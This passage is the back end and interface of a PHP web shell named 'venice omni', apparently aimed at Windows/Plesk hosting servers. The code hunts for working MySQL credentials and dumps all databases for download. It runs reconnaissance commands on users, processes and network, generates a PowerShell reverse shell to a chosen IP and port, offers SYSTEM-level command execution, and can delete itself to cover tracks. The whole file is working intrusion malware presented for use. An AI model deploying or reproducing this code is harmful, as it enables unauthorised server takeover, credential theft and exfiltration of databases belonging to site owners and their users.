            if(stripos($r,'Access denied')===false&&stripos($r,'ERROR')===false&&strpos($r,'1')!==false){ $good=$c; $port=$pt; break 2; } } }
        $o.= $good ? t('db_working').": ".$good[0]." @ ".$port." (".$good[2].")\n" : t('no_cred')."\n";
        if($good){
            $r=run(q($my).' -h 127.0.0.1 -P '.$port.' -u '.q($good[0]).' -p'.q($good[1]).' -e "SHOW DATABASES"');
            $o.="\n--- ".t('db_list')." ---\n".$r;
        }
        if($dd){ $o.="\n--- ".t('db_data')." ---\n".(implode(' ',(array)@scandir($dd))); }
        echo h($o); exit;
    }

    if($m==='dump'||$m==='all'){
        $db=preg_replace('/[^A-Za-z0-9_$\-]/','',p('db'));
        $pt=(int)p('port',3306);
        $u=p('u'); $pw=p('pw');
        if($dump===''||$u===''){ header('Content-Type: text/plain'); echo t('no_dump'); exit; }
        while(ob_get_level()) @ob_end_clean();
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.($m==='all'?'ALL':$db).'.sql"');
        header('X-Accel-Buffering: no');
        $b=q($dump).' -h 127.0.0.1 -P '.$pt.' -u '.q($u).' -p'.q($pw).' --single-transaction --routines --triggers --events --skip-lock-tables --default-character-set=utf8mb4 --hex-blob --no-tablespaces ';
        stream_cmd($m==='all' ? $b.'--all-databases' : $b.$db); exit;
    }

    if($m==='raw'){
        $db=preg_replace('/[^A-Za-z0-9_$\-]/','',p('db'));
        if($dd===''||!@is_dir($dd.'/'.$db)){ header('Content-Type: text/plain'); echo t('nf'); exit; }
        zstream($dd.'/'.$db); exit;
    }

    if($m==='query'){
        $u=p('u'); $pw=p('pw'); $pt=(int)p('port',3306); $db=p('db'); $sq=p('q');
        if($my===''){ echo t('no_mysql'); exit; }
        echo h(run(q($my).' -h 127.0.0.1 -P '.$pt.' -u '.q($u).' -p'.q($pw).' '.($db?q($db):'').' -e '.q($sq))); exit;
    }
    exit;
}

/* ---------------- SUNUCU ---------------- */
case 'srv': {
    $m=p('m','info');
    $map=array(
        'info'=>array('systeminfo | findstr /i "OS Name OS Version System Type Boot Device"','hostname','ipconfig /all','route print','netstat -ano'),
        'users'=>array('net user','net localgroup administrators','net localgroup "Remote Desktop Users"','query user'),
        'svc'=>array('sc query type= service state= all | findstr /i "SERVICE_NAME DISPLAY_NAME"'),
        'proc'=>array('tasklist /v'),
        'net'=>array('netstat -anob','arp -a','net share','net use'),
        'tasks'=>array('schtasks /query /fo LIST /v'),
        'soft'=>array('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /v DisplayName'),
        'hosts'=>array('type C:\\Windows\\System32\\drivers\\etc\\hosts'),
        'plesk'=>array('dir "C:\\Program Files (x86)\\Plesk" /a /b','dir "C:\\Program Files (x86)\\Plesk\\admin\\bin" /a /b','reg query "HKLM\\SOFTWARE\\WOW6432Node\\PLESK\\PSA Config\\Config"'),
    );
    if(!isset($map[$m])){ echo t('nf'); exit; }
    $o='';
    foreach($map[$m] as $c){ $o.="\n===== $c =====\n".run($c); }
    echo h($o); exit;
}

/* ---------------- ARAÇLAR ---------------- */
case 'tool': {
    $m=p('m');
    if($m==='b64d'){ echo h((string)@base64_decode(p('v'))); exit; }
    if($m==='b64e'){ echo base64_encode(p('v')); exit; }
    if($m==='rev'){ echo h('powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\''.p('ip').'\','.(int)p('port').');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\'PS \'+ (pwd).Path + \'> \';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'); exit; }
    if($m==='phpinfo'){
        $o=''; foreach(array('disable_functions','open_basedir','memory_limit','max_execution_time','upload_max_filesize','post_max_size','allow_url_fopen','short_open_tag','error_log') as $k) $o.=$k.' = '.@ini_get($k)."\n";
        $o.="extensions: ".implode(' ',(array)@get_loaded_extensions())."\n";
        echo h($o); exit;
    }
    if($m==='self'){ @register_shutdown_function('unlink',SELF); echo t('willdel'); exit; }
    exit;
}

case 'safe': { @setcookie('vsf',p('v')==='1'?'1':'0',time()+2592000,'/'); echo 'ok'; exit; }
case 'lang': { @setcookie('vl',p('v')==='en'?'en':'tr',time()+2592000,'/'); echo 'ok'; exit; }
}
}

/* ================= ARAYÜZ ================= */
?><!DOCTYPE html><html lang="<?php echo $LANG?'en':'tr'; ?>"><head><meta charset="utf-8"><title>venice omni</title>
<style>
*{box-sizing:border-box}
body{background:#080a0e;color:#c9d1d9;font:13px/1.45 Consolas,monospace;margin:0}
#bar{background:#12161d;border-bottom:1px solid #2a313b;padding:7px;display:flex;gap:5px;flex-wrap:wrap;align-items:center;position:sticky;top:0;z-index:20}
#bar input[type=text]{flex:1;min-width:150px;background:#080a0e;border:1px solid #2a313b;color:#c9d1d9;padding:6px;border-radius:4px}
button,.btn{background:#1a1f27;border:1px solid #2a313b;color:#c9d1d9;padding:6px 9px;border-radius:4px;cursor:pointer;font:inherit}
button:hover{background:#242c36}
.g{background:#1f6feb;border-color:#388bfd;color:#fff}.r{background:#7d2222;border-color:#a33;color:#fff}.y{background:#7a5f14;border-color:#a88513;color:#fff}.on{background:#1f6feb;color:#fff}
#tabs{background:#0e1218;border-bottom:1px solid #2a313b;padding:0 7px;display:flex;gap:2px}
#tabs div{padding:7px 12px;cursor:pointer;color:#8b949e;border-bottom:2px solid transparent;font-size:12px}
#tabs div.a{color:#58a6ff;border-color:#1f6feb}
#w{padding:8px 12px 70px}
.crumb{background:#12161d;border:1px solid #2a313b;border-radius:5px;padding:6px 9px;margin-bottom:8px;word-break:break-all}
.crumb a{cursor:pointer;color:#58a6ff;text-decoration:none;padding:0 2px}.crumb .up{color:#f0883e;margin-right:8px}.crumb .sep{color:#3a424d}
.meta{color:#8b949e;font-size:12px;margin:0 0 8px}
table{width:100%;border-collapse:collapse;font-size:12.5px}
td{padding:4px 6px;border-bottom:1px solid #161c24;vertical-align:middle}
tr:hover{background:#0e1218}
td.ic{width:18px;color:#8b949e}td.nm{word-break:break-all}
td.nm a{cursor:pointer;color:#c9d1d9;text-decoration:none}
td.sz,td.pm,td.dt{color:#8b949e;white-space:nowrap;width:1%}
td.ac{text-align:right;white-space:nowrap;width:1%}
a.b{color:#8b949e;cursor:pointer;font-size:11px;border:1px solid #2a313b;padding:2px 5px;border-radius:3px;margin-left:3px;text-decoration:none}
a.b:hover{background:#242c36;color:#fff}a.b.d:hover{background:#7d2222;color:#fff}
.ok{color:#3fb950}.no{color:#f85149}.empty{color:#8b949e;text-align:center;padding:18px}
textarea{width:100%;height:52vh;background:#080a0e;color:#c9d1d9;border:1px solid #2a313b;border-radius:5px;padding:9px;font:12.5px/1.5 Consolas,monospace}
.wrap{white-space:pre-wrap;word-break:break-all;font-size:12px}
#out{white-space:pre-wrap;word-break:break-all;max-height:44vh;overflow:auto;font-size:12px;color:#7ee787;background:#04060a;border:1px solid #2a313b;border-radius:5px;padding:8px;margin-bottom:6px;min-height:40px}
#msg{position:fixed;bottom:9px;left:9px;right:9px;background:#12161d;border:1px solid #2a313b;padding:8px;border-radius:5px;display:none;font-size:12px;z-index:99;white-space:pre-wrap}
#lock{background:#7a5f14;color:#fff;padding:4px 12px;font-size:12px;display:none}
.row{display:flex;gap:5px;margin-bottom:6px;flex-wrap:wrap}
.row input,.row select{background:#080a0e;border:1px solid #2a313b;color:#c9d1d9;padding:6px;border-radius:4px}
.row input[type=text]{flex:1}
.lg{display:flex;gap:2px;border:1px solid #2a313b;border-radius:4px;overflow:hidden}
.lg button{border:0;border-radius:0;padding:6px 8px;font-size:11px}
.lg button.sel{background:#1f6feb;color:#fff}
</style></head><body>

<div id="bar">
  <input type="text" id="pin" placeholder="path" onkeydown="if(event.key==='Enter')go(this.value)">
  <button class="g" onclick="go(document.getElementById('pin').value)">go</button>
  <button onclick="go('/')">/</button>
  <button onclick="drv()">C:/</button>
  <button onclick="ls()" id="b_ref">ref</button>
  <button onclick="mkd()" id="b_mkd">+dir</button>
  <button onclick="mkf()" id="b_mkf">+file</button>
  <button onclick="document.getElementById('uf').click()" id="b_up">up</button>
  <button onclick="zd()" id="b_zip">zip</button>
  <button onclick="fnd()" id="b_fnd">find</button>
  <button id="lk" class="y" onclick="tSafe()">lock</button>
  <button class="r" onclick="location='?out=1'" id="b_out">exit</button>
  <span class="lg"><button id="l_tr" class="<?php echo $LANG?'':'sel'; ?>" onclick="setLang('tr')">TR</button><button id="l_en" class="<?php echo $LANG?'sel':''; ?>" onclick="setLang('en')">EN</button></span>
  <input type="file" id="uf" multiple style="display:none" onchange="up()">
</div>
<div id="tabs">
  <div class="a" onclick="tab('f',this)" id="t_f">files</div>
  <div onclick="tab('t',this)" id="t_t">terminal</div>
  <div onclick="tab('s',this)" id="t_s">SYSTEM</div>
  <div onclick="tab('d',this)" id="t_d">db</div>
  <div onclick="tab('v',this)" id="t_v">server</div>
  <div onclick="tab('x',this)" id="t_x">tools</div>
</div>
<div id="lock"></div>
<div id="w"><div id="main"></div></div>
<div id="msg"></div>

<script>
var CUR=<?php echo json_encode(str_replace('\\','/',@getcwd())); ?>;
var SAFE=<?php echo $SAFE?1:0; ?>;
var LANG=<?php echo $LANG; ?>;
var T={
 'up':['yukari','up'],'ref':['yenile','refresh'],'mkd':['+dizin','+dir'],'mkf':['+dosya','+file'],
 'upb':['yukle','upload'],'zip':['zip','zip'],'fnd':['ara','find'],'lock':['kilit','lock'],'exit':['cikis','exit'],
 'files':['dosyalar','files'],'terminal':['terminal','terminal'],'sys':['SYSTEM','SYSTEM'],'db':['veritabani','database'],
 'server':['sunucu','server'],'tools':['araclar','tools'],
 'lockmsg':['KILIT AKTIF — yazma engelli','LOCKED — writes blocked'],'locked':['KILIT','LOCKED'],
 'unlocked':['kilit acik','unlocked'],
 'view':['goz','view'],'dl':['indir','download'],'perm':['izin','perm'],'ren':['ad','rename'],'cp':['kopya','copy'],
 'del':['sil','delete'],'save':['KAYDET','SAVE'],'hash':['hash','hash'],'hex':['hex','hex'],'raw':['ham','raw'],
 'back':['geri','back'],'delq':['sil?','delete?'],'newname':['yeni ad:','new name:'],'copyas':['kopya adi:','copy as:'],
 'dirname':['dizin adi:','directory name:'],'filename':['dosya adi:','file name:'],'search':['ada gore ara:','search by name:'],
 'permprompt':['show / grant / grantr / attr- / attr+','show / grant / grantr / attr- / attr+'],
 'drive':['surucu:','drive:'],'cmdp':['komut','command'],'run':['calistir','run'],
 'scan':['tara','scan'],'inst':['exe indir','get exe'],'systest':['SYSTEM testi','SYSTEM test'],'kill':['exe sil','rm exe'],
 'dbtest':['teshis + kimlik avi','diagnose + credential hunt'],'all':['HEPSINI INDIR','DOWNLOAD ALL'],
 'rawzip':['ham zip','raw zip'],'cred':['kimlik','cred'],'nocred':['calisan kimlik yok','no working credentials'],
 'b64e':['b64 kodla','b64 encode'],'b64d':['b64 coz','b64 decode'],'rev':['reverse shell','reverse shell'],
 'phpinfo':['php bilgi','php info'],'self':['kendini sil','self delete'],'text':['metin','text']
};
function t(k){ var a=T[k]; return a? a[LANG] : k; }
function applyLang(){
 var m={'b_ref':'ref','b_mkd':'mkd','b_mkf':'mkf','b_up':'upb','b_zip':'zip','b_fnd':'fnd','b_out':'exit',
        't_f':'files','t_t':'terminal','t_s':'sys','t_d':'db','t_v':'server','t_x':'tools'};
 for(var k in m){ var el=document.getElementById(k); if(el) el.textContent=t(m[k]); }
 document.getElementById('lk').textContent=t('lock');
 document.getElementById('lock').textContent=t('lockmsg');
 document.getElementById('pin').placeholder=(LANG?'path':'yol');
}
function setLang(l){ api({a:'lang',p:CUR,v:l}).then(function(){ LANG = l==='en'?1:0; document.getElementById('l_tr').className=LANG?'':'sel'; document.getElementById('l_en').className=LANG?'sel':''; applyLang(); ls(); }); }
function b64(s){return btoa(unescape(encodeURIComponent(s)))}
function msg(t2){var m=document.getElementById('msg');m.textContent=t2;m.style.display='block';setTimeout(function(){m.style.display='none'},6000)}
function api(o){return fetch(location.pathname,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'d='+encodeURIComponent(b64(JSON.stringify(o)))}).then(function(r){return r.text()})}
function ls(){api({a:'ls',p:CUR}).then(function(h){document.getElementById('main').innerHTML=h;var c=document.getElementById('cur');if(c){CUR=c.value;document.getElementById('pin').value=CUR}})}
function go(p){if(!p)return;CUR=p.replace(/\\/g,'/');ls()}
function drv(){var k=prompt(t('drive'),'C:/');if(k)go(k)}
function dl(f){location=location.pathname+'?dl='+encodeURIComponent(btoa(f))}
function raw(f){window.open(location.pathname+'?raw='+encodeURIComponent(btoa(f)))}
function zd(){location=location.pathname+'?zd='+encodeURIComponent(btoa(CUR))}
function view(f){api({a:'read',p:CUR,f:f}).then(function(h){document.getElementById('main').innerHTML=h;window.ED=f;var c=document.getElementById('cur');if(c)CUR=c.value})}
function save(f){if(SAFE)return msg(t('locked'));f=f||window.ED;var el=document.getElementById('ed');if(el)api({a:'save',p:CUR,f:f,c:el.value}).then(msg)}
function del(f){if(SAFE)return msg(t('locked'));if(confirm(t('delq')+'\n'+f))api({a:'del',p:CUR,f:f}).then(function(r){msg(r);ls()})}
function ren(f){if(SAFE)return msg(t('locked'));var n=prompt(t('newname'),f.split('/').pop());if(n)api({a:'ren',p:CUR,f:f,n:n}).then(function(r){msg(r);ls()})}
function cp(f){if(SAFE)return msg(t('locked'));var n=prompt(t('copyas'),f.split('/').pop());if(n)api({a:'copy',p:CUR,f:f,n:n}).then(function(r){msg(r);ls()})}
function mkd(){if(SAFE)return msg(t('locked'));var n=prompt(t('dirname'));if(n)api({a:'mk',p:CUR,n:n}).then(function(r){msg(r);ls()})}
function mkf(){if(SAFE)return msg(t('locked'));var n=prompt(t('filename'));if(n)api({a:'mkfile',p:CUR,n:n}).then(function(r){msg(r);ls()})}
function fnd(){var q=prompt(t('search'));if(q)api({a:'find',p:CUR,q:q}).then(function(h){document.getElementById('main').innerHTML=h})}
function hsh(f){api({a:'hash',p:CUR,f:f}).then(msg)}
function hx(f){api({a:'hex',p:CUR,f:f}).then(function(h){document.getElementById('main').innerHTML=h})}
function perm(f){var m=prompt(t('permprompt'),'show');if(m)api({a:'perm',p:CUR,f:f,m:m}).then(function(r){document.getElementById('main').innerHTML='<div class="crumb"><a onclick="ls()">&uarr;</a>'+f+'</div><div class="wrap">'+r+'</div>'})}
function up(){if(SAFE)return msg(t('locked'));var fi=document.getElementById('uf');if(!fi.files.length)return;
  var fd=new FormData();fd.append('d',b64(JSON.stringify({a:'up',p:CUR})));
  for(var i=0;i<fi.files.length;i++)fd.append('file[]',fi.files[i]);
  fetch(location.pathname,{method:'POST',body:fd}).then(function(r){return r.text()}).then(function(x){msg(x);fi.value='';ls()})}
function tSafe(){SAFE=SAFE?0:1;api({a:'safe',p:CUR,v:SAFE});document.getElementById('lk').className=SAFE?'on':'y';document.getElementById('lock').style.display=SAFE?'block':'none';msg(SAFE?t('lockmsg'):t('unlocked'))}
function tab(x,el){var n=document.querySelectorAll('#tabs div');for(var i=0;i<n.length;i++)n[i].className='';el.className='a';
  if(x==='f')return ls();
  if(x==='t')return ui_term();
  if(x==='s')return ui_sys();
  if(x==='d')return ui_db();
  if(x==='v')return ui_srv();
  if(x==='x')return ui_tool();}
function ui_term(){document.getElementById('main').innerHTML=
 '<div class="row"><select id="tsh"><option value="cmd">cmd</option><option value="ps">powershell</option></select>'+
 '<select id="tas"><option value="user">user</option><option value="sys">SYSTEM</option></select>'+
 '<input type="text" id="tin" placeholder="'+t('cmdp')+'" onkeydown="if(event.key===\'Enter\')exe()"><button class="g" onclick="exe()">'+t('run')+'</button></div>'+
 '<div id="out"></div>';}
function exe(){var c=document.getElementById('tin').value;if(!c)return;var o=document.getElementById('out');o.textContent='...';
 api({a:'exec',p:CUR,c:c,sh:document.getElementById('tsh').value,as:document.getElementById('tas').value}).then(function(r){o.textContent=r})}
function ui_sys(){document.getElementById('main').innerHTML=
 '<div class="crumb">SYSTEM</div>'+
 '<div class="row"><button class="g" onclick="sy(\'check\')">'+t('scan')+'</button><button onclick="sy(\'install\')">'+t('inst')+'</button>'+
 '<button onclick="sy(\'test\')">'+t('systest')+'</button><button class="r" onclick="sy(\'kill\')">'+t('kill')+'</button></div><div id="out"></div>';}
function sy(m){api({a:'sys',p:CUR,m:m}).then(function(r){document.getElementById('out').innerHTML=r})}
function ui_db(){document.getElementById('main').innerHTML='<div class="crumb">'+t('db')+'</div><div class="row"><button class="g" onclick="db(\'diag\')">'+t('dbtest')+'</button></div><div id="out"></div><div id="dbl"></div>';db('diag')}
function db(m){api({a:'db',p:CUR,m:m}).then(function(r){document.getElementById('out').textContent=r;if(m==='diag')parseDb(r)})}
function parseDb(x){var re=/CALISAN: (\S+) @ (\d+) \(([^)]*)\)/;var z=x.match(re);var box=document.getElementById('dbl');
 if(!z){box.innerHTML='<div class="meta no">'+t('nocred')+'</div>';return}
 var u=z[1],pt=z[2],pw=z[3];window.DBC={u:u,pw:pw,pt:pt};
 var m=x.split('--- '+(LANG?'databases':'veritabanlari')+' ---')[1]||'';var names=m.split('\n').map(function(s){return s.trim()}).filter(function(s){return s&&!/Database|ERROR|^$/.test(s)});
 var h='<div class="meta">'+t('cred')+': '+u+'</div><button class="g" onclick="dball()">'+t('all')+'</button><table>';
 names.forEach(function(n){h+='<tr><td class="nm"><a onclick="dbdump(\''+n+'\')">'+n+'</a></td><td class="ac"><a class="b" onclick="dbdump(\''+n+'\')">.sql</a><a class="b" onclick="dbraw(\''+n+'\')">'+t('rawzip')+'</a></td></tr>'});
 box.innerHTML=h+'</table>'}
function dball(){if(!window.DBC)return;location=location.pathname+'?d='+encodeURIComponent(b64(JSON.stringify({a:'db',m:'all',u:DBC.u,pw:DBC.pw,port:DBC.pt})))}
function dbdump(n){if(!window.DBC)return;location=location.pathname+'?d='+encodeURIComponent(b64(JSON.stringify({a:'db',m:'dump',db:n,u:DBC.u,pw:DBC.pw,port:DBC.pt})))}
function dbraw(n){location=location.pathname+'?d='+encodeURIComponent(b64(JSON.stringify({a:'db',m:'raw',db:n})))}
function ui_srv(){var m=['info','users','svc','proc','net','tasks','soft','hosts','plesk'];
 var h='<div class="row">';m.forEach(function(x){h+='<button onclick="sv(\''+x+'\')">'+x+'</button>'});h+='</div><div id="out"></div>';
 document.getElementById('main').innerHTML=h}
function sv(m){api({a:'srv',p:CUR,m:m}).then(function(r){document.getElementById('out').textContent=r})}
function ui_tool(){document.getElementById('main').innerHTML=
 '<div class="crumb">'+t('tools')+'</div>'+
 '<div class="row"><input type="text" id="tv" placeholder="'+t('text')+'"><button onclick="tl(\'b64e\')">'+t('b64e')+'</button><button onclick="tl(\'b64d\')">'+t('b64d')+'</button></div>'+
 '<div class="row"><input type="text" id="tip" placeholder="ip" style="flex:0 0 150px"><input type="text" id="tpo" placeholder="port" value="4444" style="flex:0 0 90px"><button onclick="rev()">'+t('rev')+'</button></div>'+
 '<div class="row"><button onclick="tl(\'phpinfo\')">'+t('phpinfo')+'</button><button class="r" onclick="tl(\'self\')">'+t('self')+'</button></div><div id="out"></div>'}
function tl(m){api({a:'tool',p:CUR,m:m,v:document.getElementById('tv')?document.getElementById('tv').value:''}).then(function(r){document.getElementById('out').textContent=r})}
function rev(){api({a:'tool',p:CUR,m:'rev',ip:document.getElementById('tip').value,port:document.getElementById('tpo').value}).then(function(r){document.getElementById('out').textContent=r})}
if(SAFE){document.getElementById('lk').className='on';document.getElementById('lock').style.display='block'}
applyLang();
ls();
</script></body></html>